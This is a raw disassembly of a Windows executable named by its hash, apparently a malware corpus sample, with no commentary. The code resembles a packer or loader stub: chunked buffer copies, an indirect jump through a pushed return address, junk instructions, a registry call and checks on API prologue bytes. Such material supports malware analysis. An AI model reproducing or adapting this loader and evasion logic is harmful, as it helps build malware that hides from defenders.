
604b9f308f7410460075417ef8046e969225f0c3934037be276f12484568c4bf.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	call   0x401440
  401008:	mov    eax,ds:0x41a1e8
  40100d:	push   eax
  40100e:	call   0x401040
  401013:	add    esp,0x4
  401016:	mov    ds:0x41a1ec,eax
  40101b:	pop    ebp
  40101c:	ret    
  40101d:	int3   
  40101e:	int3   
  40101f:	int3   
  401020:	push   ebp
  401021:	mov    ebp,esp
  401023:	call   0x401000
  401028:	mov    eax,ds:0x41a1ec
  40102d:	push   eax
  40102e:	call   0x401f90
  401033:	add    esp,0x4
  401036:	mov    ds:0x41a1f0,eax
  40103b:	pop    ebp
  40103c:	ret    
  40103d:	int3   
  40103e:	int3   
  40103f:	int3   
  401040:	push   ebp
  401041:	mov    ebp,esp
  401043:	mov    eax,DWORD PTR [ebp+0x8]
  401046:	mov    eax,DWORD PTR [eax-0x4]
  401049:	pop    ebp
  40104a:	ret    
  40104b:	int3   
  40104c:	int3   
  40104d:	int3   
  40104e:	int3   
  40104f:	int3   
  401050:	push   ebp
  401051:	mov    ebp,esp
  401053:	mov    eax,ds:0x41a128
  401058:	mov    ds:0x41a1f4,eax
  40105d:	pop    ebp
  40105e:	ret    
  40105f:	int3   
  401060:	push   ebp
  401061:	mov    ebp,esp
  401063:	sub    esp,0x2c8
  401069:	push   ebx
  40106a:	push   esi
  40106b:	push   edi
  40106c:	mov    DWORD PTR [ebp-0x28c],0x402040
  401076:	mov    DWORD PTR ds:0x41a1f8,ebp
  40107c:	pusha  
  40107d:	call   0x401050
  401082:	mov    DWORD PTR [ebp-0x290],0x0
  40108c:	mov    DWORD PTR [ebp-0x2a0],0x80000002
  401096:	call   0x401340
  40109b:	test   eax,eax
  40109d:	je     0x4010d7
  40109f:	call   0x401410
  4010a4:	mov    eax,ds:0x41a1e8
  4010a9:	push   eax
  4010aa:	call   0x401040
  4010af:	add    esp,0x4
  4010b2:	mov    ds:0x41a1ec,eax
  4010b7:	mov    ecx,DWORD PTR ds:0x41a1ec
  4010bd:	push   ecx
  4010be:	call   0x401f90
  4010c3:	add    esp,0x4
  4010c6:	mov    ds:0x41a1fc,eax
  4010cb:	mov    edx,DWORD PTR ds:0x41a1ec
  4010d1:	mov    DWORD PTR [ebp-0x298],edx
  4010d7:	mov    DWORD PTR [ebp-0x284],0x64
  4010e1:	mov    DWORD PTR [ebp-0x224],0x1
  4010eb:	mov    DWORD PTR [ebp-0x290],0x0
  4010f5:	mov    DWORD PTR [ebp-0x258],0x0
  4010ff:	mov    DWORD PTR [ebp-0x280],0x1
  401109:	mov    DWORD PTR [ebp-0x21c],0x0
  401113:	mov    eax,DWORD PTR [ebp-0x290]
  401119:	cmp    eax,DWORD PTR ds:0x41a1ec
  40111f:	jae    0x4011ab
  401125:	mov    ecx,DWORD PTR [ebp-0x298]
  40112b:	push   ecx
  40112c:	mov    edx,DWORD PTR [ebp-0x284]
  401132:	push   edx
  401133:	call   0x4020e0
  401138:	add    esp,0x8
  40113b:	mov    DWORD PTR [ebp-0x29c],eax
  401141:	mov    eax,DWORD PTR [ebp-0x29c]
  401147:	push   eax
  401148:	mov    ecx,DWORD PTR ds:0x41a1e8
  40114e:	add    ecx,DWORD PTR [ebp-0x258]
  401154:	push   ecx
  401155:	mov    edx,DWORD PTR ds:0x41a1fc
  40115b:	add    edx,DWORD PTR [ebp-0x290]
  401161:	push   edx
  401162:	call   0x401df0
  401167:	add    esp,0xc
  40116a:	mov    eax,DWORD PTR [ebp-0x224]
  401170:	add    eax,DWORD PTR [ebp-0x284]
  401176:	add    eax,DWORD PTR [ebp-0x258]
  40117c:	mov    DWORD PTR [ebp-0x258],eax
  401182:	mov    ecx,DWORD PTR [ebp-0x290]
  401188:	add    ecx,DWORD PTR [ebp-0x284]
  40118e:	mov    DWORD PTR [ebp-0x290],ecx
  401194:	mov    edx,DWORD PTR [ebp-0x298]
  40119a:	sub    edx,DWORD PTR [ebp-0x29c]
  4011a0:	mov    DWORD PTR [ebp-0x298],edx
  4011a6:	jmp    0x401113
  4011ab:	mov    eax,ds:0x41a1ec
  4011b0:	push   eax
  4011b1:	mov    ecx,DWORD PTR ds:0x41a1fc
  4011b7:	push   ecx
  4011b8:	call   0x402160
  4011bd:	add    esp,0x8
  4011c0:	mov    DWORD PTR [ebp-0x258],0x0
  4011ca:	mov    DWORD PTR [ebp-0x2bc],0x0
  4011d4:	mov    edx,DWORD PTR ds:0x41a1ec
  4011da:	push   edx
  4011db:	push   0x0
  4011dd:	mov    eax,ds:0x41a1f0
  4011e2:	push   eax
  4011e3:	call   0x401020
  4011e8:	add    esp,0xc
  4011eb:	mov    ecx,DWORD PTR ds:0x41a1ec
  4011f1:	mov    DWORD PTR [ebp-0x2c4],ecx
  4011f7:	mov    edx,DWORD PTR [ebp-0x2bc]
  4011fd:	cmp    edx,DWORD PTR ds:0x41a1ec
  401203:	jae    0x40128e
  401209:	mov    eax,DWORD PTR [ebp-0x2c4]
  40120f:	push   eax
  401210:	mov    ecx,DWORD PTR [ebp-0x284]
  401216:	push   ecx
  401217:	call   0x4020e0
  40121c:	add    esp,0x8
  40121f:	mov    DWORD PTR [ebp-0x2c8],eax
  401225:	mov    edx,DWORD PTR [ebp-0x2c8]
  40122b:	push   edx
  40122c:	mov    eax,ds:0x41a1e8
  401231:	add    eax,DWORD PTR [ebp-0x258]
  401237:	push   eax
  401238:	mov    ecx,DWORD PTR ds:0x41a1f0
  40123e:	add    ecx,DWORD PTR [ebp-0x2bc]
  401244:	push   ecx
  401245:	call   0x401df0
  40124a:	add    esp,0xc
  40124d:	mov    edx,DWORD PTR [ebp-0x224]
  401253:	add    edx,DWORD PTR [ebp-0x284]
  401259:	add    edx,DWORD PTR [ebp-0x258]
  40125f:	mov    DWORD PTR [ebp-0x258],edx
  401265:	mov    eax,DWORD PTR [ebp-0x2bc]
  40126b:	add    eax,DWORD PTR [ebp-0x284]
  401271:	mov    DWORD PTR [ebp-0x2bc],eax
  401277:	mov    ecx,DWORD PTR [ebp-0x2c4]
  40127d:	sub    ecx,DWORD PTR [ebp-0x2c8]
  401283:	mov    DWORD PTR [ebp-0x2c4],ecx
  401289:	jmp    0x4011f7
  40128e:	mov    edx,DWORD PTR ds:0x41a1ec
  401294:	push   edx
  401295:	mov    eax,ds:0x41a1f0
  40129a:	push   eax
  40129b:	call   0x402160
  4012a0:	add    esp,0x8
  4012a3:	mov    DWORD PTR [ebp-0x28c],0x402040
  4012ad:	mov    ecx,DWORD PTR ds:0x41a1fc
  4012b3:	mov    edx,DWORD PTR ds:0x41a1f0
  4012b9:	mov    DWORD PTR [ecx],edx
  4012bb:	push   0x19000
  4012c0:	call   0x401f90
  4012c5:	add    esp,0x4
  4012c8:	mov    ds:0x41a200,eax
  4012cd:	mov    eax,ds:0x41a200
  4012d2:	add    eax,0x200
  4012d7:	mov    ds:0x41a204,eax
  4012dc:	push   0x17700
  4012e1:	mov    ecx,DWORD PTR ds:0x41a1fc
  4012e7:	push   ecx
  4012e8:	mov    edx,DWORD PTR ds:0x41a204
  4012ee:	push   edx
  4012ef:	call   0x401df0
  4012f4:	add    esp,0xc
  4012f7:	mov    eax,ds:0x41a200
  4012fc:	add    eax,0x17590
  401301:	mov    ds:0x41a208,eax
  401306:	mov    ecx,ecx
  401308:	mov    ecx,ecx
  40130a:	mov    ecx,ecx
  40130c:	popa   
  40130d:	mov    ecx,ecx
  40130f:	mov    ecx,ecx
  401311:	mov    ecx,ecx
  401313:	mov    ecx,ecx
  401315:	push   0x37
  401317:	mov    eax,DWORD PTR [ebp-0x28c]
  40131d:	mov    ecx,ecx
  40131f:	mov    ecx,ecx
  401321:	mov    ecx,esp
  401323:	sub    ecx,0x22
  401326:	mov    edx,0x1e
  40132b:	mov    edx,edx
  40132d:	mov    DWORD PTR [ecx+edx*1+0x4],eax
  401331:	mov    edx,edx
  401333:	ret    
  401334:	mov    edx,edx
  401336:	xor    eax,eax
  401338:	pop    edi
  401339:	pop    esi
  40133a:	pop    ebx
  40133b:	mov    esp,ebp
  40133d:	pop    ebp
  40133e:	ret    
  40133f:	int3   
  401340:	push   ebp
  401341:	mov    ebp,esp
  401343:	sub    esp,0x14
  401346:	mov    eax,ds:0x41a12c
  40134b:	mov    DWORD PTR [ebp-0x10],eax
  40134e:	mov    DWORD PTR [ebp-0xc],0x41a010
  401355:	mov    DWORD PTR [ebp-0x4],0x41a070
  40135c:	mov    ecx,DWORD PTR ds:0x41a144
  401362:	mov    DWORD PTR [ebp-0x8],ecx
  401365:	lea    edx,[ebp-0x14]
  401368:	push   edx
  401369:	mov    eax,DWORD PTR [ebp-0xc]
  40136c:	push   eax
  40136d:	push   0x80000002
  401372:	call   DWORD PTR [ebp-0x8]
  401375:	test   eax,eax
  401377:	jne    0x401382
  401379:	mov    eax,0x1
  40137e:	jmp    0x4013b4
  401380:	jmp    0x40138b
  401382:	call   0x401340
  401387:	xor    eax,eax
  401389:	jmp    0x4013b4
  40138b:	mov    ecx,DWORD PTR [ebp-0x10]
  40138e:	movzx  edx,BYTE PTR [ecx]
  401391:	cmp    edx,0x55
  401394:	je     0x4013b4
  401396:	mov    eax,DWORD PTR [ebp-0x10]
  401399:	movzx  ecx,BYTE PTR [eax]
  40139c:	cmp    ecx,0x8b
  4013a2:	je     0x4013b4
  4013a4:	mov    edx,DWORD PTR [ebp-0x10]
  4013a7:	movzx  eax,BYTE PTR [edx]
  4013aa:	cmp    eax,0x6a
  4013ad:	je     0x4013b4
  4013af:	call   0x4013c0
  4013b4:	mov    esp,ebp
  4013b6:	pop    ebp
  4013b7:	ret    
  4013b8:	int3   
  4013b9:	int3   
  4013ba:	int3   
  4013bb:	int3   
  4013bc:	int3   
  4013bd:	int3   
  4013be:	int3   
  4013bf:	int3   
  4013c0:	push   ebp
  4013c1:	mov    ebp,esp
  4013c3:	call   0x401060
  4013c8:	pop    ebp
  4013c9:	ret    
  4013ca:	int3   
  4013cb:	int3   
  4013cc:	int3   
  4013cd:	int3   
  4013ce:	int3   
  4013cf:	int3   
  4013d0:	push   ebp
  4013d1:	mov    ebp,esp
  4013d3:	mov    eax,ds:0x41a20c
  4013d8:	sub    eax,0x8
  4013db:	shr    eax,1
  4013dd:	mov    ds:0x41a20c,eax
  4013e2:	pop    ebp
  4013e3:	ret    
  4013e4:	int3   
  4013e5:	int3   
  4013e6:	int3   
  4013e7:	int3   
  4013e8:	int3   
  4013e9:	int3   
  4013ea:	int3   
  4013eb:	int3   
  4013ec:	int3   
  4013ed:	int3   
  4013ee:	int3   
  4013ef:	int3   
  4013f0:	push   ebp
  4013f1:	mov    ebp,esp
  4013f3:	pop    ebp
  4013f4:	ret    0x10
  4013f7:	int3   
  4013f8:	int3   
  4013f9:	int3   
  4013fa:	int3   
  4013fb:	int3   
  4013fc:	int3   
  4013fd:	int3   
  4013fe:	int3   
  4013ff:	int3   
  401400:	push   ebp
  401401:	mov    ebp,esp
  401403:	pop    ebp
  401404:	ret    0x10
  401407:	int3   
  401408:	int3   
  401409:	int3   
  40140a:	int3   
  40140b:	int3   
  40140c:	int3   
  40140d:	int3   
  40140e:	int3   
  40140f:	int3   
  401410:	push   ebp
  401411:	mov    ebp,esp
  401413:	sub    esp,0x10
  401416:	mov    DWORD PTR [ebp-0x10],0x402499
  40141d:	mov    DWORD PTR [ebp-0x4],0x4
  401424:	mov    eax,DWORD PTR [ebp-0x10]
  401427:	add    eax,DWORD PTR [ebp-0x4]
  40142a:	mov    DWORD PTR [ebp-0xc],eax
  40142d:	mov    ecx,DWORD PTR [ebp-0xc]
  401430:	mov    DWORD PTR [ebp-0x8],ecx
  401433:	mov    edx,DWORD PTR [ebp-0x8]
  401436:	mov    DWORD PTR ds:0x41a1e8,edx
  40143c:	mov    esp,ebp
  40143e:	pop    ebp
  40143f:	ret    
  401440:	push   ebp
  401441:	mov    ebp,esp
  401443:	sub    esp,0x8
  401446:	mov    DWORD PTR [ebp-0x4],0x4
  40144d:	mov    eax,DWORD PTR [ebp-0x4]
  401450:	add    eax,0x402290
  401455:	mov    ds:0x41a1e8,eax
  40145a:	mov    ecx,DWORD PTR ds:0x41a148
  401460:	mov    DWORD PTR [ebp-0x8],ecx
  401463:	mov    esp,ebp
  401465:	pop    ebp
  401466:	ret    
  401467:	int3   
  401468:	int3   
  401469:	int3   
  40146a:	int3   
  40146b:	int3   
  40146c:	int3   
  40146d:	int3   
  40146e:	int3   
  40146f:	int3   
  401470:	push   ebp
  401471:	mov    ebp,esp
  401473:	sub    esp,0x8
  401476:	mov    DWORD PTR [ebp-0x4],0x86de
  40147d:	mov    DWORD PTR [ebp-0x4],0x86de
  401484:	mov    DWORD PTR [ebp-0x4],0x86de
  40148b:	mov    DWORD PTR [ebp-0x4],0x86de
  401492:	mov    DWORD PTR [ebp-0x4],0x86de
  401499:	mov    DWORD PTR [ebp-0x4],0x86de
  4014a0:	mov    DWORD PTR [ebp-0x4],0x86de
  4014a7:	mov    DWORD PTR [ebp-0x4],0x86de
  4014ae:	mov    DWORD PTR [ebp-0x4],0x86de
  4014b5:	mov    DWORD PTR [ebp-0x4],0x86de
  4014bc:	mov    DWORD PTR [ebp-0x4],0x86de
  4014c3:	mov    DWORD PTR [ebp-0x4],0x86de
  4014ca:	mov    DWORD PTR [ebp-0x4],0x86de
  4014d1:	mov    DWORD PTR [ebp-0x4],0x86de
  4014d8:	mov    DWORD PTR [ebp-0x4],0x86de
  4014df:	mov    DWORD PTR [ebp-0x4],0x86de
  4014e6:	mov    DWORD PTR [ebp-0x4],0x86de
  4014ed:	mov    DWORD PTR [ebp-0x4],0x86de
  4014f4:	mov    DWORD PTR [ebp-0x4],0x86de
  4014fb:	mov    DWORD PTR [ebp-0x4],0x86de
  401502:	mov    DWORD PTR [ebp-0x4],0x86de
  401509:	mov    DWORD PTR [ebp-0x4],0x86de
  401510:	mov    DWORD PTR [ebp-0x4],0x86de
  401517:	mov    DWORD PTR [ebp-0x4],0x86de
  40151e:	mov    DWORD PTR [ebp-0x4],0x86de
  401525:	mov    DWORD PTR [ebp-0x4],0x86de
  40152c:	mov    DWORD PTR [ebp-0x4],0x86de
  401533:	mov    DWORD PTR [ebp-0x4],0x86de
  40153a:	mov    DWORD PTR [ebp-0x4],0x86de
  401541:	mov    DWORD PTR [ebp-0x4],0x86de
  401548:	mov    DWORD PTR [ebp-0x4],0x86de
  40154f:	mov    DWORD PTR [ebp-0x4],0x86de
  401556:	mov    DWORD PTR [ebp-0x4],0x86de
  40155d:	mov    DWORD PTR [ebp-0x4],0x86de
  401564:	mov    DWORD PTR [ebp-0x4],0x86de
  40156b:	mov    DWORD PTR [ebp-0x4],0x86de
  401572:	mov    DWORD PTR [ebp-0x4],0x86de
  401579:	mov    DWORD PTR [ebp-0x4],0x86de
  401580:	mov    DWORD PTR [ebp-0x4],0x86de
  401587:	mov    DWORD PTR [ebp-0x4],0x86de
  40158e:	mov    DWORD PTR [ebp-0x4],0x86de
  401595:	mov    DWORD PTR [ebp-0x4],0x86de
  40159c:	mov    DWORD PTR [ebp-0x4],0x86de
  4015a3:	mov    DWORD PTR [ebp-0x4],0x86de
  4015aa:	mov    DWORD PTR [ebp-0x4],0x86de
  4015b1:	mov    DWORD PTR [ebp-0x4],0x86de
  4015b8:	mov    DWORD PTR [ebp-0x4],0x86de
  4015bf:	mov    DWORD PTR [ebp-0x4],0x86de
  4015c6:	mov    DWORD PTR [ebp-0x4],0x86de
  4015cd:	mov    DWORD PTR [ebp-0x4],0x86de
  4015d4:	mov    DWORD PTR [ebp-0x4],0x86de
  4015db:	mov    DWORD PTR [ebp-0x4],0x86de
  4015e2:	mov    DWORD PTR [ebp-0x4],0x86de
  4015e9:	mov    DWORD PTR [ebp-0x4],0x86de
  4015f0:	mov    DWORD PTR [ebp-0x4],0x86de
  4015f7:	mov    DWORD PTR [ebp-0x4],0x86de
  4015fe:	mov    DWORD PTR [ebp-0x4],0x86de
  401605:	mov    DWORD PTR [ebp-0x4],0x86de
  40160c:	mov    DWORD PTR [ebp-0x4],0x86de
  401613:	mov    DWORD PTR [ebp-0x4],0x86de
  40161a:	mov    DWORD PTR [ebp-0x4],0x86de
  401621:	mov    DWORD PTR [ebp-0x4],0x86de
  401628:	mov    DWORD PTR [ebp-0x4],0x86de
  40162f:	mov    DWORD PTR [ebp-0x4],0x86de
  401636:	mov    DWORD PTR [ebp-0x4],0x86de
  40163d:	mov    DWORD PTR [ebp-0x4],0x86de
  401644:	mov    DWORD PTR [ebp-0x4],0x86de
  40164b:	mov    DWORD PTR [ebp-0x4],0x86de
  401652:	mov    DWORD PTR [ebp-0x4],0x86de
  401659:	mov    DWORD PTR [ebp-0x4],0x86de
  401660:	mov    DWORD PTR [ebp-0x4],0x86de
  401667:	mov    DWORD PTR [ebp-0x4],0x86de
  40166e:	mov    DWORD PTR [ebp-0x4],0x86de
  401675:	mov    DWORD PTR [ebp-0x4],0x86de
  40167c:	mov    DWORD PTR [ebp-0x4],0x86de
  401683:	mov    DWORD PTR [ebp-0x4],0x86de
  40168a:	mov    DWORD PTR [ebp-0x4],0x86de
  401691:	mov    DWORD PTR [ebp-0x4],0x86de
  401698:	mov    DWORD PTR [ebp-0x4],0x86de
  40169f:	mov    DWORD PTR [ebp-0x4],0x86de
  4016a6:	mov    DWORD PTR [ebp-0x4],0x86de
  4016ad:	mov    DWORD PTR [ebp-0x4],0x86de
  4016b4:	mov    DWORD PTR [ebp-0x4],0x86de
  4016bb:	mov    DWORD PTR [ebp-0x4],0x86de
  4016c2:	mov    DWORD PTR [ebp-0x4],0x86de
  4016c9:	mov    DWORD PTR [ebp-0x4],0x86de
  4016d0:	mov    DWORD PTR [ebp-0x4],0x86de
  4016d7:	mov    DWORD PTR [ebp-0x4],0x86de
  4016de:	mov    DWORD PTR [ebp-0x4],0x86de
  4016e5:	mov    DWORD PTR [ebp-0x4],0x86de
  4016ec:	mov    DWORD PTR [ebp-0x4],0x86de
  4016f3:	mov    DWORD PTR [ebp-0x4],0x86de
  4016fa:	mov    DWORD PTR [ebp-0x4],0x86de
  401701:	mov    DWORD PTR [ebp-0x4],0x86de
  401708:	mov    DWORD PTR [ebp-0x4],0x86de
  40170f:	mov    DWORD PTR [ebp-0x4],0x86de
  401716:	mov    DWORD PTR [ebp-0x4],0x86de
  40171d:	mov    DWORD PTR [ebp-0x4],0x86de
  401724:	mov    DWORD PTR [ebp-0x4],0x86de
  40172b:	mov    DWORD PTR [ebp-0x4],0x86de
  401732:	mov    DWORD PTR [ebp-0x4],0x86de
  401739:	mov    DWORD PTR [ebp-0x4],0x86de
  401740:	mov    DWORD PTR [ebp-0x4],0x86de
  401747:	mov    DWORD PTR [ebp-0x4],0x86de
  40174e:	mov    DWORD PTR [ebp-0x4],0x86de
  401755:	mov    DWORD PTR [ebp-0x4],0x86de
  40175c:	mov    DWORD PTR [ebp-0x4],0x86de
  401763:	mov    DWORD PTR [ebp-0x4],0x86de
  40176a:	mov    DWORD PTR [ebp-0x4],0x86de
  401771:	mov    DWORD PTR [ebp-0x4],0x86de
  401778:	mov    DWORD PTR [ebp-0x4],0x86de
  40177f:	mov    DWORD PTR [ebp-0x4],0x86de
  401786:	mov    DWORD PTR [ebp-0x4],0x86de
  40178d:	mov    DWORD PTR [ebp-0x4],0x86de
  401794:	mov    DWORD PTR [ebp-0x4],0x86de
  40179b:	mov    DWORD PTR [ebp-0x4],0x86de
  4017a2:	mov    DWORD PTR [ebp-0x4],0x86de
  4017a9:	mov    DWORD PTR [ebp-0x4],0x86de
  4017b0:	mov    DWORD PTR [ebp-0x4],0x86de
  4017b7:	mov    DWORD PTR [ebp-0x4],0x86de
  4017be:	mov    DWORD PTR [ebp-0x4],0x86de
  4017c5:	mov    DWORD PTR [ebp-0x4],0x86de
  4017cc:	mov    DWORD PTR [ebp-0x4],0x86de
  4017d3:	mov    DWORD PTR [ebp-0x4],0x86de
  4017da:	mov    DWORD PTR [ebp-0x4],0x86de
  4017e1:	mov    DWORD PTR [ebp-0x4],0x86de
  4017e8:	mov    DWORD PTR [ebp-0x4],0x86de
  4017ef:	mov    DWORD PTR [ebp-0x4],0x86de
  4017f6:	mov    DWORD PTR [ebp-0x4],0x86de
  4017fd:	mov    DWORD PTR [ebp-0x4],0x86de
  401804:	mov    DWORD PTR [ebp-0x4],0x86de
  40180b:	mov    DWORD PTR [ebp-0x4],0x86de
  401812:	mov    DWORD PTR [ebp-0x4],0x86de
  401819:	mov    DWORD PTR [ebp-0x4],0x86de
  401820:	mov    DWORD PTR [ebp-0x4],0x86de
  401827:	mov    DWORD PTR [ebp-0x4],0x86de
  40182e:	mov    DWORD PTR [ebp-0x4],0x86de
  401835:	mov    DWORD PTR [ebp-0x4],0x86de
  40183c:	mov    DWORD PTR [ebp-0x4],0x86de
  401843:	mov    DWORD PTR [ebp-0x4],0x86de
  40184a:	mov    DWORD PTR [ebp-0x4],0x86de
  401851:	mov    DWORD PTR [ebp-0x4],0x86de
  401858:	mov    DWORD PTR [ebp-0x4],0x86de
  40185f:	mov    DWORD PTR [ebp-0x4],0x86de
  401866:	mov    DWORD PTR [ebp-0x4],0x86de
  40186d:	mov    DWORD PTR [ebp-0x4],0x86de
  401874:	mov    DWORD PTR [ebp-0x4],0x86de
  40187b:	mov    DWORD PTR [ebp-0x4],0x86de
  401882:	mov    DWORD PTR [ebp-0x4],0x86de
  401889:	mov    DWORD PTR [ebp-0x4],0x86de
  401890:	mov    DWORD PTR [ebp-0x4],0x86de
  401897:	mov    DWORD PTR [ebp-0x4],0x86de
  40189e:	mov    DWORD PTR [ebp-0x4],0x86de
  4018a5:	mov    DWORD PTR [ebp-0x4],0x86de
  4018ac:	mov    DWORD PTR [ebp-0x4],0x86de
  4018b3:	mov    DWORD PTR [ebp-0x4],0x86de
  4018ba:	mov    DWORD PTR [ebp-0x4],0x86de
  4018c1:	mov    DWORD PTR [ebp-0x4],0x86de
  4018c8:	mov    DWORD PTR [ebp-0x4],0x86de
  4018cf:	mov    DWORD PTR [ebp-0x4],0x86de
  4018d6:	mov    DWORD PTR [ebp-0x4],0x86de
  4018dd:	mov    DWORD PTR [ebp-0x4],0x86de
  4018e4:	mov    DWORD PTR [ebp-0x4],0x86de
  4018eb:	mov    DWORD PTR [ebp-0x4],0x86de
  4018f2:	mov    DWORD PTR [ebp-0x4],0x86de
  4018f9:	mov    DWORD PTR [ebp-0x4],0x86de
  401900:	mov    DWORD PTR [ebp-0x4],0x86de
  401907:	mov    DWORD PTR [ebp-0x4],0x86de
  40190e:	mov    DWORD PTR [ebp-0x4],0x86de
  401915:	mov    DWORD PTR [ebp-0x4],0x86de
  40191c:	mov    DWORD PTR [ebp-0x4],0x86de
  401923:	mov    DWORD PTR [ebp-0x4],0x86de
  40192a:	mov    DWORD PTR [ebp-0x4],0x86de
  401931:	mov    DWORD PTR [ebp-0x4],0x86de
  401938:	mov    DWORD PTR [ebp-0x4],0x86de
  40193f:	mov    DWORD PTR [ebp-0x4],0x86de
  401946:	mov    DWORD PTR [ebp-0x4],0x86de
  40194d:	mov    DWORD PTR [ebp-0x4],0x86de
  401954:	mov    DWORD PTR [ebp-0x4],0x86de
  40195b:	mov    DWORD PTR [ebp-0x4],0x86de
  401962:	mov    DWORD PTR [ebp-0x4],0x86de
  401969:	mov    DWORD PTR [ebp-0x4],0x86de
  401970:	mov    DWORD PTR [ebp-0x4],0x86de
  401977:	mov    DWORD PTR [ebp-0x4],0x86de
  40197e:	mov    DWORD PTR [ebp-0x4],0x86de
  401985:	mov    DWORD PTR [ebp-0x4],0x86de
  40198c:	mov    DWORD PTR [ebp-0x4],0x86de
  401993:	mov    DWORD PTR [ebp-0x4],0x86de
  40199a:	mov    DWORD PTR [ebp-0x4],0x86de
  4019a1:	mov    DWORD PTR [ebp-0x4],0x86de
  4019a8:	mov    DWORD PTR [ebp-0x4],0x86de
  4019af:	mov    DWORD PTR [ebp-0x4],0x86de
  4019b6:	mov    DWORD PTR [ebp-0x4],0x86de
  4019bd:	mov    DWORD PTR [ebp-0x4],0x86de
  4019c4:	mov    DWORD PTR [ebp-0x4],0x86de
  4019cb:	mov    DWORD PTR [ebp-0x4],0x86de
  4019d2:	mov    DWORD PTR [ebp-0x4],0x86de
  4019d9:	mov    DWORD PTR [ebp-0x4],0x86de
  4019e0:	mov    DWORD PTR [ebp-0x4],0x86de
  4019e7:	mov    DWORD PTR [ebp-0x4],0x86de
  4019ee:	mov    DWORD PTR [ebp-0x4],0x86de
  4019f5:	mov    DWORD PTR [ebp-0x4],0x86de
  4019fc:	mov    DWORD PTR [ebp-0x4],0x86de
  401a03:	mov    DWORD PTR [ebp-0x4],0x86de
  401a0a:	mov    DWORD PTR [ebp-0x4],0x86de
  401a11:	mov    DWORD PTR [ebp-0x4],0x86de
  401a18:	mov    DWORD PTR [ebp-0x4],0x86de
  401a1f:	mov    DWORD PTR [ebp-0x4],0x86de
  401a26:	mov    DWORD PTR [ebp-0x4],0x86de
  401a2d:	mov    DWORD PTR [ebp-0x4],0x86de
  401a34:	mov    DWORD PTR [ebp-0x4],0x86de
  401a3b:	mov    DWORD PTR [ebp-0x4],0x86de
  401a42:	mov    DWORD PTR [ebp-0x4],0x86de
  401a49:	mov    DWORD PTR [ebp-0x4],0x86de
  401a50:	mov    DWORD PTR [ebp-0x4],0x86de
  401a57:	mov    DWORD PTR [ebp-0x4],0x86de
  401a5e:	mov    DWORD PTR [ebp-0x4],0x86de
  401a65:	mov    DWORD PTR [ebp-0x4],0x86de
  401a6c:	mov    DWORD PTR [ebp-0x4],0x86de
  401a73:	mov    DWORD PTR [ebp-0x4],0x86de
  401a7a:	mov    DWORD PTR [ebp-0x4],0x86de
  401a81:	mov    DWORD PTR [ebp-0x4],0x86de
  401a88:	mov    DWORD PTR [ebp-0x4],0x86de
  401a8f:	mov    DWORD PTR [ebp-0x4],0x86de
  401a96:	mov    DWORD PTR [ebp-0x4],0x86de
  401a9d:	mov    DWORD PTR [ebp-0x4],0x86de
  401aa4:	mov    DWORD PTR [ebp-0x4],0x86de
  401aab:	mov    DWORD PTR [ebp-0x4],0x86de
  401ab2:	mov    DWORD PTR [ebp-0x4],0x86de
  401ab9:	mov    DWORD PTR [ebp-0x4],0x86de
  401ac0:	mov    DWORD PTR [ebp-0x4],0x86de
  401ac7:	mov    DWORD PTR [ebp-0x4],0x86de
  401ace:	mov    DWORD PTR [ebp-0x4],0x86de
  401ad5:	mov    DWORD PTR [ebp-0x4],0x86de
  401adc:	mov    DWORD PTR [ebp-0x4],0x86de
  401ae3:	mov    DWORD PTR [ebp-0x4],0x86de
  401aea:	mov    DWORD PTR [ebp-0x4],0x86de
  401af1:	mov    DWORD PTR [ebp-0x4],0x86de
  401af8:	mov    DWORD PTR [ebp-0x4],0x86de
  401aff:	mov    DWORD PTR [ebp-0x4],0x86de
  401b06:	mov    DWORD PTR [ebp-0x4],0x86de
  401b0d:	mov    DWORD PTR [ebp-0x4],0x86de
  401b14:	mov    DWORD PTR [ebp-0x4],0x86de
  401b1b:	mov    DWORD PTR [ebp-0x4],0x86de
  401b22:	mov    DWORD PTR [ebp-0x4],0x86de
  401b29:	mov    DWORD PTR [ebp-0x4],0x86de
  401b30:	mov    DWORD PTR [ebp-0x4],0x86de
  401b37:	mov    DWORD PTR [ebp-0x4],0x86de
  401b3e:	mov    DWORD PTR [ebp-0x4],0x86de
  401b45:	mov    DWORD PTR [ebp-0x4],0x86de
  401b4c:	mov    DWORD PTR [ebp-0x4],0x86de
  401b53:	mov    DWORD PTR [ebp-0x4],0x86de
  401b5a:	mov    DWORD PTR [ebp-0x4],0x86de
  401b61:	mov    DWORD PTR [ebp-0x4],0x86de
  401b68:	mov    DWORD PTR [ebp-0x4],0x86de
  401b6f:	mov    DWORD PTR [ebp-0x4],0x86de
  401b76:	mov    DWORD PTR [ebp-0x4],0x86de
  401b7d:	mov    DWORD PTR [ebp-0x4],0x86de
  401b84:	mov    DWORD PTR [ebp-0x4],0x86de
  401b8b:	mov    DWORD PTR [ebp-0x4],0x86de
  401b92:	mov    DWORD PTR [ebp-0x4],0x86de
  401b99:	mov    DWORD PTR [ebp-0x4],0x86de
  401ba0:	mov    DWORD PTR [ebp-0x4],0x86de
  401ba7:	mov    DWORD PTR [ebp-0x4],0x86de
  401bae:	mov    DWORD PTR [ebp-0x4],0x86de
  401bb5:	mov    DWORD PTR [ebp-0x4],0x86de
  401bbc:	mov    DWORD PTR [ebp-0x4],0x86de
  401bc3:	mov    DWORD PTR [ebp-0x4],0x86de
  401bca:	mov    DWORD PTR [ebp-0x4],0x86de
  401bd1:	mov    DWORD PTR [ebp-0x4],0x86de
  401bd8:	mov    DWORD PTR [ebp-0x4],0x86de
  401bdf:	mov    DWORD PTR [ebp-0x4],0x86de
  401be6:	mov    DWORD PTR [ebp-0x4],0x86de
  401bed:	mov    DWORD PTR [ebp-0x4],0x86de
  401bf4:	mov    DWORD PTR [ebp-0x4],0x86de
  401bfb:	mov    DWORD PTR [ebp-0x4],0x86de
  401c02:	mov    DWORD PTR [ebp-0x4],0x86de
  401c09:	mov    DWORD PTR [ebp-0x4],0x86de
  401c10:	mov    DWORD PTR [ebp-0x4],0x86de
  401c17:	mov    DWORD PTR [ebp-0x4],0x86de
  401c1e:	mov    DWORD PTR [ebp-0x4],0x86de
  401c25:	mov    DWORD PTR [ebp-0x4],0x86de
  401c2c:	mov    DWORD PTR [ebp-0x4],0x86de
  401c33:	mov    DWORD PTR [ebp-0x4],0x86de
  401c3a:	mov    DWORD PTR [ebp-0x4],0x86de
  401c41:	mov    DWORD PTR [ebp-0x4],0x86de
